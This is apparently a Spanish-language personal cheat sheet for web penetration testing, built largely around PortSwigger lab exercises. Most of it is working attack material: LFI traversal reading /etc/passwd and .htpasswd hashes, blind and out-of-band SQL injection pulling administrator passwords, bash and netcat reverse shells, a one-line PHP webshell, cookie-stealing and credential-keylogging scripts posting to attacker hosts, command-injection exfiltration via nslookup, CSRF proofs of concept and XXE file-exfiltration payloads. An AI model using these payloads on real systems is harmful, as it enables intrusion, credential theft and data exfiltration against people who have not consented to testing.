# Web

************************************************************************************************
# BurpSuite

## Repeater
A través de esta herramienta se puede probar el reenvío de peticiones
+ Probar headers
+ Parámetros, desde su cambio y la ausencia del parámetro 

## Intruder
A través de esta herramienta se pueden automatizar una serie de ataques
+ Null payloads
	+ Puede mostrar comportamientos anómalos en el sistema
	+ Por ejemplo: En un sistema de compras, al añadir items de manera indefinida en algún punto puede pasar de "Totales" en números positivos a números negativos
+ Character Blocks
	+ Puede mostrar comportamientos anómalos en el sistema
	+ Por ejemplo: En un sistema de registro de correo electrónico, podría llenar todo el tamaño de una cadena.

## Target
+ Site Map - engagement tools - Search
+ Site Map - engagement tools - Find Comments
+ Site Map - engagement tools - Find Scripts
+ Site Map - engagement tools - Find References
+ Site Map - engagement tools - Analize Target
+ Site Map - engagement tools - Discovery Content
+ Site Map - engagement tools - Scheluded task
+ Site Map - engagement tools - Simulate Manual Testing

## Extensiones
### Hackvector
+ Extensions > Hackvertor > Encode > hex_entities
+ Extension: Content-Type-Converter

************************************************************************************************
# Envío de información
## Vía POST

**BASH**
~~~bash
curl --header "Content-Type: application/json" \
	--request POST \
	--data '{"username":"xyz","password":"xyz"}' \
	http://localhost:3000/
~~~

Más información
+ https://linuxize.com/post/curl-post-request/


## Vía GET
**BASH**
<!--
~~~bash
GET_USER="user"
GET_PASS="pass"
URL=""
curl https://reqbin.com/
~~~
-->

************************************************************************************************
# Google Dorks
## Buscadores
+ Google
+ Duckduckgo
+ bing
~~~bash
# inurl
inurl:view/view.shtml
inurl:/cgi-bin/guestimage.html
inurl:"/owa/auth/logon.asp"

# intitle
intitle:"index of /"
intitle:"Nessus Scan Report"
intitle:"index of /" "Microsfot-ISS/6.0"
intitle:"index of /" “Microsfot-ISS/5.0”

# filetype
filetype:txt
filetype:sql
filetype:xlsx
filetype:md

# Concatenando (Bloqueado desde google, pero vigente en duckduckgo y bing)
site:* filetype:xlsx

# link (-site:sitioexcluido)
link:www.sitioejemplo.com -site:sitioejemplo.com
link:www.sitioejemplo.com -site:sitioejemplo.com -site:sitioejemploespana.com -site:sitioejemplomexico.com

# Password
filetype:inc intext:mysql_connect password -please -could

# Obtener información de un sitio
info:site.com

# Ver si está habilitada la indexación de carpetas
intitle:"index of" site:site.com

# Ver información del conusuario.servidorto de whois
whois site.com
~~~

## Bing
~~~bash
# contains
# Los resultados esperados están dentro de un CMS programado en el lenguaje que se indique
contains:php filetype.pdf

# ip medio parchado, pero se puede evadir vía url
# https://www.bing.com/search?q=IP:108.167.137.42
IP:108.167.137.42
~~~

************************************************************************************************
# Herramientas útiles
## eyewitness
~~~bash
git clone https://github.com/RedSiege/EyeWitness.git

cat ips_all.txt | (while read hostname; do cat puertos_unicos.txt | (while read PORT; do echo $hostname:$PORT; done); done) > eyewitness.txt
~~~
+ https://github.com/RedSiege/EyeWitness

## whois
~~~bash
sudo apt install whois

cat ../ips.txt | (while read ip; do whois $ip | tee $(date +%d-%m-%Y)_$ip; done)

~~~

## Ver tu IP pública
~~~
curl ifconfig.me
~~~

## Webhook
Para recibir emails y peticiones sin una IP pública
+ https://webhook.site


************************************************************************************************
# LFI (Local File Inclusion)

## LFI
~~~bash
# añadir parametros una busqueda para generar errores nos muestra recursos que podrían ser de utilidad
http://172.16.22.14/index.html?page=blog&id=coso
	# Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /var/www/html/pages/blog.php on line 20
~~~

## Escapar la concatenación con extensión

```bash
# Si la página concatena (nombre + .php)
http://172.16.22.14/index.html?page=blog

# Esto buscaría passwd.php
http://172.16.22.14/index.html?page=../../../../etc/passwd

# Para evitarlo usar el terminador de cadena de C (%00)
http://172.16.22.14/index.html?page=../../../../etc/passwd%00

# Sacando los usuarios que serán de interes debido a sus privilegios
http://172.16.22.14/index.html?page=../../../../etc/groups%00


http://172.16.22.14/index.html?page=../../../../../etc/group%00
	# users:x:100:usuario1,usuario2,usuario3,admin
	# admins:x:507:usuario1,admin

# Anexo: Lo que pasa en c:
	# char cadena[30] = "Hola mundo";
	# char cadena2[30] = "hola mun\0do";
	# puts(cadena); // Hola mundo
	# puts(cadena2); // Hola mun
```

## Sitios con configuraciones .htaccess
Tomando como base:
+ http://172.16.22.14/index.html?page=blog (Sitio con LFI)
+ http://172.16.22.14/restringido (Este pide autenticación DIGEST o BASIC)

Inferimos que tenemos dos sitios:
+ /var/www/html/sitioweb
+ /var/www/html/restringido

Por lo que podemos:
~~~bash
# Obtenemos configuración de .htaccess
http://172.16.22.14/index.html?page=../restringido/.htaccess%00
# /var/www/html/sitioweb/..restringido/.htaccess
	# AuthType Basic
	# AuthName "Restricted - authentication required"
# Aquí incluimos la ruta de los password hasheados
	# AuthUserFile /var/www/html/restringido/.htpasswd 
	# Require valid-user

# Obtenemos configuración de .htaccess
http://172.16.22.14/index.html?page=../restringido/.htpasswd%00
	# user1:mHjBL6MLRc3nQ
	# user2:OkNYEpU0yapIs
	# admin:vjX9YIkiN3RL6
~~~

El hasheo es de 13 caracteres
+ vjX9YIkiN3RL6
+ DES 13 chars 


************************************************************************************************
# SQL Injection

## Database version
~~~sql
-- Oracle
SELECT banner FROM v$version
SELECT version FROM v$instance
-- Microsoft
SELECT @@version
-- PostgreSQL
SELECT version()
-- MySQL
SELECT @@version
~~~

## Notas generales
~~~sql
-- Notas importantes
LIMIT 1 -- Trunca el resultado tras la primer coincidencia
WHERE ROWNUM = 1 -- Trunca el resultado tras la primer ORACLE

LENGTH(password) -- Longitud de la variable

SUBSTRING(password,1,1) -- (variable,posicion,cantidad_letras_a_extraer)
	-- hola
	SUBSTRING(password,1,1) -- h
	SUBSTRING(password,2,1) -- o
	SUBSTRING(password,2,3) -- ola

CAST((SELECT example_column FROM example_table) AS int) 
	-- ERROR: invalid input syntax for type integer: "Example data"
~~~

## Exfiltrado de información
~~~sql
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

SELECT YOUR_COLUMN_NAME||'~'||YOUR_COLUMN_NAME FROM YOUR_TABLE_NAME
~~~

## Basado en errores

### Ejemplo CAST
~~~sql
-- Obteniendo errores
' AND CAST((SELECT 1) AS int)-- c
'-- Obteniendo errores
' AND 1=CAST((SELECT 1) AS int)-- c

'-- Obtiene el primer <username> de la tabla <users> # Observar si la cadena de error se "trunca" debido al limite de caracteres
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- c

'-- Obtiene el primer <password> de la tabla <users> # Observar si la cadena de error se "trunca" debido al limite de caracteres
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- c
~~~

## Blind
### Ejemplo cookies
~~~sql
-- Conocer si hay una tabla llamada <users>
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a' -- c

'-- Conocer si existe el usuario <administrator> en la tabla <users>
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a' -- c

'-- Conocer la longitud del <password> del usuario <administrator> en la tabla <users>
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>0)='a' -- c

'-- Conocer la letra de la primera posicion del <password> longitud del <password> del usuario <administrator> en la tabla <users>
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' -- c

'-- Automatizacion con ClusterBomb e Intruder
TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§' -- c
~~~

### Ejemplo CASE
~~~sql
-- Conocer si hay una tabla llamada <users>
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||' -- c

-- Conocer si existe el usuario <administrator> en la tabla <users>
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' -- c

-- Conocer la longitud del <password> del usuario <administrator> en la tabla <users> # 200 ok in response
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||' -- c

-- Conocer la longitud del <password> del usuario <administrator> en la tabla <users> # 200 ok in response
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' -- c

-- Automatizacion con ClusterBomb en Burp Proxy Intruder # 500 error in response
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' -- c
~~~

### Ejemplo TIME
~~~sql
'-- Comprobamos si existe un delay
'; SELECT pg_sleep(3) -- c
'-- Comprobamos si existe un delay en sentencias CASE
'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END -- c

'-- Conocer si existe el usuario <administrator> en la tabla <users>
'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator' -- c

'-- Conocer si existe un campo password mayor a 0 del usuario <administrator> en la tabla <users> # sleep 3s
'; SELECT CASE WHEN LENGTH(password)>0 THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator' -- c

'-- Automatizacion con ClusterBomb en Burp Proxy Intruder # 500 error in response
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN pg_sleep(3) ELSE '' END FROM users WHERE username='administrator')||' -- c
~~~

### Ejemplo out-of-band interaction
~~~sql
-- Posibles payloads
-- Oracle
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')

-- Microsoft
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'

-- PostgreSQL
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'

-- MySQL
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'

-- Posibles implementaciones a partir de
'||(SELECT '') -- c
'||(SELECT '' FROM dual) -- c

-- Exfiltrado de información
propia
'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.{domain}/"> %remote;]>'),'/l') FROM dual) -- c

~~~

### Otros
~~~sql
SQL injection with filter bypass via XML encoding
+  Extensions > Hackvertor > Encode > hex_entities
~~~

## Más información
+ https://portswigger.net/web-security/sql-injection/cheat-sheet


************************************************************************************************
# sqlmap

~~~bash


~~~

************************************************************************************************
# Reverse Shell & Webshell
## Linux

### Reverse shell con bash
~~~bash
# En la máquina del ausuario.servidorante
nc -lp 9999

# En la máquina de la victima
# Cambiar IP & PORT
# bash -i >& /dev/tcp/IP/PORT 0>&1
bash -i >& /dev/tcp/172.16.16.10/9999 0>&1
bash -i >& /dev/tcp/127.0.0.1/5000 0>&1
~~~

### Reverse shell con Netcat
~~~bash
# Requiere ncat
sudo apt install ncat

# En la máquina del ausuario.servidorante
ncat -lp 1234

# En la máquina de la victima
# Requiere: apt install ncat (Especificamente este paquete para la opción -e)
# Cambiar IP & PORT
# nc -e /bin/sh IP PORT
ncat -e /bin/sh 10.0.0.1 1234
~~~

+ Puedes encontrar shells más complejas en la carpeta [reverse-shells](./reverse-shells/)

### Webshells

#### PHP POST param
~~~php
# archivo.php
<?=`$_POST[0]`?>

# Uso
curl http://localhost/ruta/archivo.php -d "0=whoami"
~~~

#### P0wny-shell
+ https://github.com/flozz/p0wny-shell/blob/master/shell.php



************************************************************************************************
# Secure Headers

## shcheck
+ https://github.com/santoru/shcheck

~~~bash
# Descarga
git clone https://github.com/santoru/shcheck.git

./shcheck.py https://site.com
~~~

## shcheckfile

~~~bash
# Requerimientos
git clone https://github.com/santoru/shcheck && cd shcheck
sudo cp shcheck.py /usr/local/bin/

# Descarga de la herramienta
git clone https://github.com/elcaza/shcheckfile.git
cd shcheckfile
./shcheckfile file.txt

~~~

************************************************************************************************
# SSL
## Herramientas

Desde la web
+ https://www.ssllabs.com/ssltest/analyze.html

ssl scan
+ https://github.com/rbsec/sslscan

testssl
+ https://github.com/drwetter/testssl.sh

Guía de cifrados seguros e inseguros
+ https://ciphersuite.info/cs/?security=all&software=openssl&singlepage=true

## TestSSL from file
~~~bash
# Descargar testssl
git clone --depth 1 https://github.com/drwetter/testssl.sh.git --branch 3.0

# Análisis de varios sitios con output en HTML
./testssl.sh --html --file sitios.txt
~~~



************************************************************************************************
# Web PortSwigger

## Command Injection

### OS command injection, simple case
~~~bash
# Special characters 
&
&&
;
||
|
~~~
Example
~~~bash
productId=1&storeId=1%26sleep+5
~~~
+ %26 = %

## Comandos útiles Linux
~~~bash
whoami
uname -a
ifconfig
netstat -an
ps -ef	
~~~

## Time delays
~~~bash
& ping -c 10 127.0.0.1 &
~~~

## Exploiting blind OS command injection by redirecting output
~~~bash
& whoami > /var/www/static/whoami.txt &
# https://vulnerable-website.com/whoami.txt
~~~

## Blind OS command injection with out-of-band data exfiltration
~~~bash
& nslookup `whoami`.web-attacker.com &
& nslookup $(whoami).web-attacker.com &
~~~

## Comandos útiles Windows
~~~cmd
whoami
ver
ipconfig /all
netstat -an
tasklist
~~~

## Tipos de ofuscación

### URL encode
+ % character and their 2-digit hex (`%26`) (&)
+ Cyberchef (*URL Decode*) (*URL Encode*)

### HTML encoding
+ prefixed with an ampersand and terminated with a semicolon. In many cases, a name can be used for the reference. For example, the sequence `&colon;` represents a colon character.
+ Alternatively, the reference may be provided using the character's **decimal** or **hex code** point, in this case, `&#58;` (:) and `&#x3a;` (:)respectively.
+ when using decimal or hex-style HTML encoding, you can optionally include an arbitrary number of leading zeros in the code points. Some WAFs and other input filters fail to adequately account for this.
	+ `<a href="javascript&#58;alert(1)">Click me</a>`
	+ `<a href="javascript&#00058;alert(1)">Click me</a>`
	+ `<a href="javascript&#00000000000000000000058;alert(1)">Click me</a>`
+ Cyberchef
	+ Decimal: (*From decimal*) (*To decimal*)
	+ Hex code: (*to hex*) (*from hex*)
	+ HTML encoding: (*From HTML Entity*) (*Ti HTML Entity*)

### XML Encode
+ This enables you to include special characters in the text content of elements without breaking the syntax, which can come in handy when testing for XSS via XML-based input, for example.
	+ `&#x53;ELECT`

### Unicode escaping
+ Unicode escape sequences consist of the prefix \u followed by the four-digit hex code for the character. For example, `\u003a` represents a colon.
	+ ES6 also supports a new form of unicode escape using curly braces: `\u{3a}`.
		+ `eval("\u0061lert(1)")`
	+ Inside a string, you can escape any characters like this. However, outside of a string, escaping some characters will result in a syntax error. This includes opening and closing parentheses
+ Cyberchef
	+ Unescape Unicode Characters
	+ Escape Unicode Characters (select encode all characters)

### hex escaping
+ Another option when injecting into a string context is to use hex escapes, which represent characters using their hexadecimal code point, prefixed with \x.
+ Cyberchef
	+ From hex
	+ To hex

### Obfuscation via octal escaping
+ Octal escaping works in pretty much the same way as hex escaping, except that the character references use a base-8 numbering system rather than base-16.
+ Cyberchef
	+ From octal
	+ To octal

### Obfuscation via multiple encodings
+ view "Más información" item

### Obfuscation via SQL CHAR() function
+ view "Más información" item

### Otras herramientas 
+ Hackvector (Plugin Burp Suite)
	+ Select > Click drecho > Extensions > Hackvector > encode > hex_entities

### Más información
+ https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-hex-escaping

## Headers web
### Evasión de bloqueos en Login Web
#### Vía X-Forwarded-For

Sustituir en las cabeceras de la petición
~~~bash
X-Forwarded-For: 2001:db8:85a3:8d3:1319:8a2e:370:7348

X-Forwarded-For: 203.0.113.195

X-Forwarded-For: 203.0.113.195, 70.41.3.18, 150.172.238.178

X-Forwarded-For: 127.0.0.1
~~~


Más información:
+ https://developer.mozilla.org/es/docs/Web/HTTP/Headers/X-Forwarded-For

### reset poisoning via middleware
#### X-Forwarded-Host

Sustituir en las cabeceras de la petición
~~~bash
X-Forwarded-Host: id42.example-cdn.com
~~~

Más información:
+ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host


## Exfiltrar información

~~~html
<script>
	fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
		method: 'POST',
		mode: 'no-cors',
		body:document.cookie
	});
</script>
~~~

## Keylogger en input
~~~html
<script>
	document.getElementsByName("password")[0].addEventListener('change',function(){
		console.log(this.value);
		the_username = document.getElementsByName("username")[0].value
		the_password = this.value;

		fetch('https://subdomain.burpcollaborator.net', {
			method: 'POST',
			mode: 'no-cors',
			body:the_username+"~"+the_password
		});
	});
</script>
~~~

## Nuevo login
~~~html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
~~~

## Cambio de contraseña inseguro
~~~html
<html>
	<body>
		<form action="https://vulnerable-website.com/email/change" method="POST">
			<input type="hidden" name="email" value="pwned@evil-user.net" />
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>
~~~

## Ejemplo CRSF en POST
~~~html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
	<form action="https://000.web-security-academy.net/my-account/change-email" method="POST">
	  <input type="hidden" name="email" value="new2&#64;email&#46;com" />
	  <input type="submit" value="Submit request" />
	</form>
	<script>
	  document.forms[0].submit();
	</script>
  </body>
</html>

~~~

## Ejemplo CRSF en GET
~~~html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
<!--  <script>history.pushState('', '', '/')</script>-->
	<form action="https://000.web-security-academy.net/my-account/change-email">
	  <input type="hidden" name="email" value="new222&#64;email&#46;com" />
	  <input type="submit" value="Submit request" />
	</form>
	<script>
	  document.forms[0].submit();
	</script>
  </body>
</html>

~~~

## Ejemplo CSRF
~~~html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
	<input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
	document.forms[0].submit();
</script>
~~~

## Ejemplo CSRF sin parametro CSRF
~~~html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
	<form action="https://000.web-security-academy.net/my-account/change-email" method="POST">
	  <input type="hidden" name="email" value="new1234&#64;email&#46;com" />
	  <input type="submit" value="Submit request" />
	</form>
	<script>
	  document.forms[0].submit();
	</script>
  </body>
</html>

~~~

## XSS

+ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

## XSS Reflejado

~~~html
<iframe src="https://000.web-security-academy.net/?search=%3Cbody+onresize=print(1)%3E" width="1px" onload=this.style.width='0px'></iframe>
~~~


~~~html
<script>
location = "https://000.web-security-academy.net/?search=%3Cvideo2+id=x+onfocus=alert(document.cookie)+tabindex=1%3E#x";
</script>
~~~

~~~html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me1</text></a>
~~~

### A partir del tag de value en un input
~~~html
"onmouseover="alert(1)
~~~

### A partir de corromper el href
~~~html
<a id="author" href="javascript:this.addEventListener(&quot;click&quot;, alert(1))">text</a>
<a id="author" href="javascript:alert(2)">text</a>
~~~

### A partir de Access Key
~~~html
Visitando:
/?'accesskey='x'onclick='alert(1)
/?'accesskey='x'onclick='alert(1)'

Referencias
<button accesskey="s">Stress reliever</button>
<link rel="canonical" accesskey="X" onclick="alert(1)" />
<link rel="alternate" accesskey="y" onclick="alert(2)" />
https://url.com/?'accesskey='x'onclick='alert(1)
~~~

### Interpretación matemática
~~~html
Funciona porque javascript lo interpreta como una ecuación matemática: 

# Multiplicación
https://000.web-security-academy.net/?search=%27*alert(1)*%27

# Resta
https://000.web-security-academy.net/?search=%27*alert(1)*%27
~~~

### Escapar terminadores
~~~javascript
https://000.web-security-academy.net/?search=\%27-alert(1);//+comentario
\'-alert(1);//+comentario

var searchTerms = '\\'-alert(1);// comentario';
~~~

### Sustituyendo windows para lanzar un error
~~~javascript

5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
~~~
Referencia:
+ https://stackoverflow.com/questions/64416874/javascript-window-object-window-what-does-this-code-do

### XXE

#### Validate if XXE exists in app
~~~xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE check [ <!ENTITY xxe "exist"> ]> 
<stockCheck><productId>&xxe;</productId></stockCheck>
~~~

#### Exploiting XXE to retrieve files
~~~xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
~~~

#### Exploiting XXE to perform SSRF attacks
~~~xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
~~~

#### Blind XXE vulnerabilities
##### Detecting blind XXE using out-of-band (OAST) techniques
~~~xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
~~~

##### With params
+ First, the declaration of an XML parameter entity includes the percent character before the entity name:
+ And second, parameter entities are referenced using the percent character instead of the usual ampersand:

~~~xml
<!-- <!ENTITY % myparameterentity "my parameter entity value" > -->
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
~~~ 
+ Observa la declaración de la variable con `% variable`
+ El uso de la variable con `%variable;` dentro de los corchetes

#### Exploiting blind XXE to exfiltrate data out-of-band
~~~xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
~~~

~~~xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
~~~
+ This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed, and the /etc/passwd file is transmitted to the attacker's server.
+ This technique might not work with some file contents, including the newline characters contained in the /etc/passwd file. This is because some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL. In this situation, it might be possible to use the FTP protocol instead of HTTP. Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as /etc/hostname can be targeted instead.

##### Example:
In the server 
~~~xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % data "<!ENTITY &#x25; exfil SYSTEM 'http://url.com/?data1=%file;'>">
%data;
%exfil;
~~~

In the Burp petition 
~~~xml
<!DOCTYPE checker
[
<!ENTITY % xxe SYSTEM "http://exploit-server.net/exploit">
%xxe;
]
>
~~~

##### Example with errors:
~~~xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % data "<!ENTITY &#x25; error SYSTEM 'file:///etc/%file;'>">
%data;
%error;
~~~

In the Burp petition 
~~~xml
<!DOCTYPE checker
[
<!ENTITY % xxe SYSTEM "http://exploit-server.net">
%xxe;
]
>
~~~

#### Exploiting blind XXE to retrieve data via error messages
##### Example
In the server:
~~~xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % data "<!ENTITY &#x25; exfil SYSTEM 'file:///%file;'>">
%data;
%exfil;
~~~

In the burpsuite petition
~~~xml
<!DOCTYPE checker
[
<!ENTITY % xxe SYSTEM "https://exploit-server.net/exploit">
%xxe;
] 
>
~~~

#### Exploiting XXE to retrieve data by repurposing a local DTD
Use percent symbol because this give you more information(?)

##### Payloads and dictionaries
+ https://github.com/GoSecure/dtd-finder/tree/master
+ https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md

#### Exploiting XInclude to retrieve files
First step, checking if the entities are allowed
~~~xml
%26entity;
~~~
+ Result:
	+ "Entities are not allowed for security reasons" or ANOTHER

Attack
~~~xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
~~~

##### Example
~~~bash
# Normal petition
productId=1&storeId=1

# Checking for entities attack
productId=%26xxe;&storeId=1

# Retrive data 
productId=<xinclude xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></xinclude>&storeId=1
~~~

#### XXE attacks via file upload
~~~xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
~~~

#### XXE attacks via modified content type


#### Más información
+ https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files
+ https://www.w3schools.com/xml/xml_dtd.asp 
+ https://github.com/streaak/keyhacks
+ https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
+ Extension: Content-Type-Converter


